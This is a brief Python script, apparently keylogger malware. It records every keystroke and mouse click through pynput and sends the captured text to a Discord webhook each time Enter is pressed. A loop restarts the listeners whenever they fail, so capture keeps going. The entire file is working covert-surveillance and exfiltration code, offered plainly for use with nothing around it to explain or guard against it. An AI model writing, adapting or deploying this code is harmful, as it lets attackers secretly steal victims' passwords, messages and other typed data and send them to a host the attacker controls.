from pynput import keyboard, mouse
from discord import SyncWebhook

webhook = SyncWebhook.from_url("INSERT_DISCORD_WEBHOOK_HERE")
log = ""
pressed = keyboard.Key

def send_to_hook(txt):
    if txt == "":
        webhook.send("nothing")
    else:
        webhook.send(txt)

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pressed.enter:
            log += "{Enter}"
            send_to_hook(log)
            log = ""
        elif key == pressed.space:
            log += " "
        elif key == pressed.backspace:
            log = log[:-1]
        elif key == pressed.shift_l or pressed.alt or pressed.caps_lock or pressed.ctrl_l or pressed.tab or pressed.shift_l:
            log += ""
        else:
            log += f"{{{key}}}"
            if len(log) >= 1998:
                send_to_hook(log)
                log = ""

def on_click(x, y, button, pressed):
    global log
    if pressed:
        if button == mouse.Button.left:
            log += "{Left C}"
        elif button == mouse.Button.right:
            log += "{Right C}"

while True:
    try:
        keyboard_listener = keyboard.Listener(on_press=on_press)
        mouse_listener = mouse.Listener(on_click=on_click)
        keyboard_listener.start()
        mouse_listener.start()
        keyboard_listener.join()
        mouse_listener.join()
    except Exception as error:
        print(f"{error}: But now retrying...")
